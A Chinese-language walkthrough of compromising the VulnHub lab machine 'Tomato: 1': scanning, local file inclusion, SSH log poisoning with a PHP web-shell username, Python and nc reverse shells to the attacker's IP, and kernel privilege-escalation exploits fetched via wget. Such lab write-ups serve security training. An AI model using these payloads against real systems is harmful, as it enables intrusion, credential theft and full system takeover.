靶机地址：[Tomato: 1 ~ VulnHub](https://www.vulnhub.com/entry/tomato-1,557/)

主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- "192.168.1.53"
sudo nmap -p "21,80,2211,8888" -sV "192.168.1.53"
# 21/tcp   open  ftp     vsftpd 3.0.3
# 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
# 2211/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
# 8888/tcp open  http    nginx 1.10.3 (Ubuntu)
```

访问FTP
```Shell
# 尝试匿名登录
ftp 192.168.1.53
# Name: anonymous
# Password:
# 登录失败
```

访问80的web服务，就一张西红柿的图片，没别的
web路径扫描
```Shell
sudo dirsearch -u "http://192.168.1.53"
# 没扫出东西 换个更大的字典试试
sudo ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.1.53/FUZZ
```
没扫出啥

访问8888的web服务看看，需要登录才能访问

一时间无从下手，还是80的服务最有可能有问题
```Shell
sudo dirsearch -u "http://192.168.1.53" -w /usr/share/seclists/Discovery/Web-Content/common.txt
# /antibot_image
```
访问 `http://192.168.1.53/antibot_image/antibots/info.php` 其源码中存在如下注释
```html
<!-- </?php include $_GET['image']; -->
```
可能存在文件包含，访问
```
http://192.168.1.53/antibot_image/antibots/info.php?image=../../../../../etc/passwd
```
确实可以读取文件（测的时候多来几层 `../` )
```
http://192.168.1.53/antibot_image/antibots/info.php?image=/etc/passwd
```
这个也可以，读取到如下敏感信息
```
root:x:0:0:root:/root:/bin/bash
tomato:x:1000:1000:Tomato,,,:/home/tomato:/bin/bash
```
再尝试远程文件包含，监听
```Shell
nc -lp 4444
```
访问
```
http://192.168.1.53/antibot_image/antibots/info.php?image=http://192.168.1.26:4444
```
没有收到连接，可能不存在远程文件包含，这点其实配置文件中也说明了
```
allow_url_include    Off    Off
```
尝试读取本地敏感文件和PHP包装器
```
http://192.168.1.53/antibot_image/antibots/info.php?image=/home/tomato/.ssh/id_rsa
http://192.168.1.53/antibot_image/antibots/info.php?image=/root/.ssh/id_rsa
http://192.168.1.53/antibot_image/antibots/info.php?image=data:text/plain,hello world
```
都失败了，还有两种可能性：通过FTP上传文件再解析，或者通过污染日志文件再解析
先看看日志文件
```
http://192.168.1.53/antibot_image/antibots/info.php?image=/var/log/apache2/access.log
```
读取失败了，说明apache的日志暂时无法利用
尝试对SSH的日志进行污染，先读取看看
```
http://192.168.1.53/antibot_image/antibots/info.php?image=/var/log/auth.log
```
成功了，读取到内容，包含了SSH和FTP的登录日志，尝试污染
```Shell
ftp 192.168.1.53
Name: <?php echo '<pre>' . @eval($_GET['cmd']) . '</pre>';?>
Password: 
```
可以看到增加了一条日志
```
Dec  7 03:58:29 ubuntu vsftpd: pam_unix(vsftpd:auth): check pass; user unknown
```
但是用户名这里不是希望看到的
再试试ssh
```Shell
ssh '<?php echo system($_GET["cmd"]);?>'@192.168.1.53 -p 2211
```
访问试试
```
http://192.168.1.53/antibot_image/antibots/info.php?image=/var/log/auth.log&cmd=id
```
可以利用，尝试反弹shell
```
http://192.168.1.53/antibot_image/antibots/info.php?image=/var/log/auth.log&cmd=nc%20192.168.1.26%204444%20-e%20/bin/bash
```
没成功，可能nc版本不支持 `-e` 参数，尝试别的方式，比如使用 `python3`
```
http://192.168.1.53/antibot_image/antibots/info.php?image=/var/log/auth.log&cmd=which%20python3

http://192.168.1.53/antibot_image/antibots/info.php?image=/var/log/auth.log&cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.1.26", 4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
成功了，获取到反弹shell
尝试提权
```Shell
wget http://192.168.1.26:7331/linux-exploit-suggester.sh
/bin/bash linux-exploit-suggester.sh
# CVE-2016-5195     40839 40611
# CVE-2017-16995    45010
# CVE-2016-8655     40871
```
尝试第二个
```Shell
searchsploit -p 45010
# Path: /usr/share/exploitdb/exploits/linux/local/45010.c
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
gcc 45010.c -o exp
python3 -m http.server 7331
```
下载执行
```Shell
wget http://192.168.1.26:7331/exp
chmod +x exp
./exp
```
成功提权

40839漏洞利用执行失败，需要先在主机上手动给二进制文件打补丁
```Shell
./exploit
# ./exploit: /lib/x86_64-linux-gnu/libcrypt.so.1: version `XCRYPT_2.0' not found (required by ./exploit)
# ./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found (required by ./exploit)

ldd exploit
# linux-vdso.so.1 (0x00007ffc39190000)
# libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f8bb5077000)
# libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f8bb5056000)
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8bb4e7d000)
# /lib64/ld-linux-x86-64.so.2 (0x00007f8bb50d3000)
cp /lib/x86_64-linux-gnu/libcrypt.so.1 /tmp/
cp /lib/x86_64-linux-gnu/libc.so.6 /tmp/
cp /lib/x86_64-linux-gnu/libpthread.so.0 /tmp/
cp /lib64/ld-linux-x86-64.so.2 /tmp/
patchelf --replace-needed libcrypt.so.1 /tmp/libcrypt.so.1 ./exploit
patchelf --replace-needed libc.so.6 /tmp/libc.so.6 ./exploit
patchelf --replace-needed libpthread.so.0 /tmp/libpthread.so.0 ./exploit
patchelf --set-interpreter /tmp/ld-linux-x86-64.so.2 ./exploit
cd /tmp
python3 -m http.server 7331

# cd /tmp
wget http://192.168.1.26:7331/libcrypt.so.1
wget http://192.168.1.26:7331/libc.so.6
wget http://192.168.1.26:7331/libpthread.so.0
wget http://192.168.1.26:7331/ld-linux-x86-64.so.2
chmod 755 libcrypt.so.1
chmod 755 libc.so.6
chmod 755 libpthread.so.0
chmod 755 ld-linux-x86-64.so.2

wget http://192.168.1.26:7331/exploit
chmod +x exploit
./exploit
```
可以成功执行，但是还是失败了

再试试另一个
```Shell
searchsploit -p 40871
# Path: /usr/share/exploitdb/exploits/linux_x86-64/local/40871.c

cp /usr/share/exploitdb/exploits/linux_x86-64/local/40871.c .
gcc 40871.c -o exploit -lpthread
ldd exploit
# linux-vdso.so.1 (0x00007ffef2975000)
# libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fa6ef34b000)
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa6ef172000)
# /lib64/ld-linux-x86-64.so.2 (0x00007fa6ef390000)
cp /lib/x86_64-linux-gnu/libc.so.6 /tmp/
cp /lib/x86_64-linux-gnu/libpthread.so.0 /tmp/
cp /lib64/ld-linux-x86-64.so.2 /tmp/
patchelf --replace-needed libc.so.6 /tmp/libc.so.6 ./exploit
patchelf --replace-needed libpthread.so.0 /tmp/libpthread.so.0 ./exploit
patchelf --set-interpreter /tmp/ld-linux-x86-64.so.2 ./exploit
cd /tmp
python3 -m http.server 7331

# cd /tmp
wget http://192.168.1.26:7331/libc.so.6
wget http://192.168.1.26:7331/libpthread.so.0
wget http://192.168.1.26:7331/ld-linux-x86-64.so.2
chmod 755 libc.so.6 libpthread.so.0 ld-linux-x86-64.so.2
# chmod 777 libc.so.6 libpthread.so.0 ld-linux-x86-64.so.2

wget http://192.168.1.26:7331/exploit
chmod +x exploit
./exploit
```
也没成功